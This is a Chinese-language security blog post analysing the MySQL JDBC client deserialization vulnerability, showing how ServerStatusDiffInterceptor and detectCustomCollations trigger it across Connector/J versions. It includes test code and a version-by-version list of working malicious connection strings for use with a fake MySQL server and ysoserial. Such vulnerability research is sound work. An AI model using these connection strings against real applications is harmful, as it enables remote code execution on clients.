> 原文链接: https://www.anquanke.com//post/id/203086 


# MySQL JDBC 客户端反序列化漏洞分析


                                阅读量   
                                **484997**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t0116c0e28b3a5aaef0.jpg)](https://p2.ssl.qhimg.com/t0116c0e28b3a5aaef0.jpg)



作者：fnmsd[@360](https://github.com/360)云安全

这几天学习了BlackHat Europe 2019的议题[《New Exploit Technique In Java Deserialization Attack》](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)， 膜拜师傅们的同时，做一个简单的漏洞分析。

该漏洞需要能够控制客户端的JDBC连接串，在连接阶段即可触发，无需继续执行SQL语句。



## 测试代码

需要自行根据版本选择JDBC连接串，最后有基于各版本Connector连接串的总结。

```
public class test1 `{`
    public static void main(String[] args) throws Exception`{`
        String driver = "com.mysql.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc";//8.x使用
        //String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc";//5.x使用
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    `}`
`}`
```

MySQL服务器使用：[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

一个可以方便的辅助MySQL客户端文件读取和提供MySQL JDBC反序列化漏洞所需序列化数据的假服务器，看本文前请先简单看下工具说明。

这里提供一份我加了JRE8u20的YSOSerial用以测试（集成了n1nty师傅的代码，膜一下）：

> 链接：[https://pan.baidu.com/s/12o5UFaln0qDUo0hPcIR1Eg](https://pan.baidu.com/s/12o5UFaln0qDUo0hPcIR1Eg) 提取码：qdfc



## ServerStatusDiffInterceptor触发方式

原议题中使用这种方法，环境应该是8.x的connector

**此处分析环境使用mysql-java-connector 8.0.14+jdk 1.8.20**

参考[ MySQL Connector/J 8.0 连接串参数属性手册](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html)

> **queryInterceptors:**一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）<br>**autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。

所以如上所述，如果要触发queryInterceptors则需要触发SQL Query，而在getConnection过程中，会触发`SET NAMES utf`、`set autocommit=1`一类的请求，所以会触发我们所配置的queryInterceptors。

`ServerStatusDiffInterceptor`的`preProcess`方法（执行SQL Query前需要执行的方法）,调用了`populateMapWithSessionStatusValues`：

[![](https://p5.ssl.qhimg.com/t0149da7d9ded8c3449.png)](https://p5.ssl.qhimg.com/t0149da7d9ded8c3449.png)

执行了`SHOW SESSION STAUS`语句并获取结果，继续跟入`resultSetToMap`方法：

[![](https://p5.ssl.qhimg.com/t01fac927f9c878a075.png)](https://p5.ssl.qhimg.com/t01fac927f9c878a075.png)

`ResultSetImpl`的getObject方法，当MySQL字段类型为BLOB时，会对数据进行反序列化，所以此处只要保证第1或第2字段为BLOB且存存储了我们的序列化数据，即可触发。

**额外说一句：**确定字段为BLOB类型除了协议报文中列字段类型为BLOB以外，还需要FLAGS大于128、来源表不为空，否则会被当做Text，开发工具的时候这块卡了好久。

[![](https://p2.ssl.qhimg.com/t01ca5166124bbcc7d5.png)](https://p2.ssl.qhimg.com/t01ca5166124bbcc7d5.png)

**测试过程中发现5.x、6.x无法正常使用，参考mysql java connector的[5.1](https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html)、[6.0](https://docs.oracle.com/cd/E17952_01/connector-j-6.0-en/connector-j-6.0-en.pdf)、[8.0](https://docs.oracle.com/cd/E17952_01/connector-j-6.0-en/connector-j-6.0-en.pdf)的连接串说明，经过分析各版本代码后总结：**
1. 从6.0开始主要使用的包名从·`com.mysql`变为了`com.mysql.cj`,所以`ServerStatusDiffInterceptor`所在位置也有所改变。
1. 5.1.11-6.0.6使用的interceptors属性为statementInterceptors，8.0以上使用的为queryInterceptors。（这块不是很确定，因为6.0的手册上说从5.1.11就开始变为queryInterceptors，但是实际测试后仍为statementInterceptors）
1. 5.1.11以下，无法直接通过连接触发：在执行getConnection时，会执行到com.mysql.jdbc.ConnectionImpl中如下代码块:
[![](https://p4.ssl.qhimg.com/t01ebb1496a5353ad37.png)](https://p4.ssl.qhimg.com/t01ebb1496a5353ad37.png)

可以发现上面标示的两行代码交换了位置（emm，不是完全一样，领会精神）。

前面分析所述的连接时的SQL查询是在createNewIO方法中会触发，但是由于5.1.10及以前，Interceptors的初始化在createNewIO之后，导致查询触发前还不存在Interceptors，故无法在getConnection时触发。

**PS：**如果继续使用获取的连接进行SQL执行，还是可以触发反序列化的。



## detectCustomCollations触发方式

这个点最早貌似是chybeta师傅找出来的，膜一下。

**一点要看的题外话：**看前面提到的5.x的手册，`detectCustomCollations`这个选项是从5.1.29开始的，经过代码比对，可以认为`detectCustomCollations`这个选项在5.1.29之前一直为true。

**测试环境中使用mysql-connector-java 5.1.29+java 1.8.20：**

触发点在`com.mysql.jdbc.ConnectionImpl`的`buildCollationMapping`方法中：

（调用栈就不放了，打个断点就到了）

[![](https://p1.ssl.qhimg.com/t013e8a2f516b995c72.png)](https://p1.ssl.qhimg.com/t013e8a2f516b995c72.png)

可以看到两个条件：
1. 服务器版本大于等于4.1.0，并且`detectCustomCollations`选项为true
**PS:** 5.1.28的这条判断条件只有服务器版本大于4.1.0
1. 获取了`SHOW COLLATION`的结果后，服务器版本大于等于5.0.0才会进入到上一节说过的`resultSetToMap`方法触发反序列化
[![](https://p2.ssl.qhimg.com/t01418aa5ab9a727026.png)](https://p2.ssl.qhimg.com/t01418aa5ab9a727026.png)

此处getObject与前文一致不再赘述，此处只需要字段2或3为BLOB装载我们的序列化数据即可。

由于从5.1.41版本开始，不再使用getObject的方式获取`SHOW COLLATION`的结果，此方法失效。

5.1.18以下未使用getObject方式进行获取，同样无法使用此方法：

[![](https://p5.ssl.qhimg.com/t01a6858be813592f15.png)](https://p5.ssl.qhimg.com/t01a6858be813592f15.png)



## 总结下可用的连接串

用户名是基于MySQL Fake Server工具的，具体使用中请自行修改。

**ServerStatusDiffInterceptor触发：**

**8.x:**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc`

**6.x(属性名不同):**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc`

**5.1.11及以上的5.x版本（包名没有了cj）:**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc`

**5.1.10及以下的5.1.X版本：**同上，但是需要连接后执行查询。

**5.0.x:**还没有`ServerStatusDiffInterceptor`这个东西┓( ´∀` )┏

**detectCustomCollations触发：**

**5.1.41及以上:**不可用

**5.1.29-5.1.40:**`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc`

**5.1.28-5.1.19：**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc`

**5.1.18以下的5.1.x版本：**不可用

**5.0.x版本不可用**



## 总结

以上总结通过MySQL JDBC Connector触发漏洞的两种方法分析以及相关版本情况，希望能对大家有所帮助。

由于仍旧是Java反序列化漏洞的范围，依然需要运行环境中有可用的Gadget。

再次膜发现漏洞的几位师傅~



## 参考文献

**漏洞相关：**

[https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)

[https://www.cnblogs.com/Welk1n/p/12056097.html](https://www.cnblogs.com/Welk1n/p/12056097.html)

[https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload](https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload)

**MySQL java Connector手册：**

[https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html](https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html)

[https://docs.oracle.com/cd/E17952_01/connector-j-6.0-en/connector-j-6.0-en.pdf](https://docs.oracle.com/cd/E17952_01/connector-j-6.0-en/connector-j-6.0-en.pdf)

[https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html)



## 最后是招聘启事哈

360云安全团队目前大量岗位招聘中，欢迎各位大佬投递简历，大家一起来愉快地玩耍~

[https://www.anquanke.com/post/id/200462](https://www.anquanke.com/post/id/200462)

[![](https://p0.ssl.qhimg.com/t0125a86c942958a650.jpg)](https://p0.ssl.qhimg.com/t0125a86c942958a650.jpg)
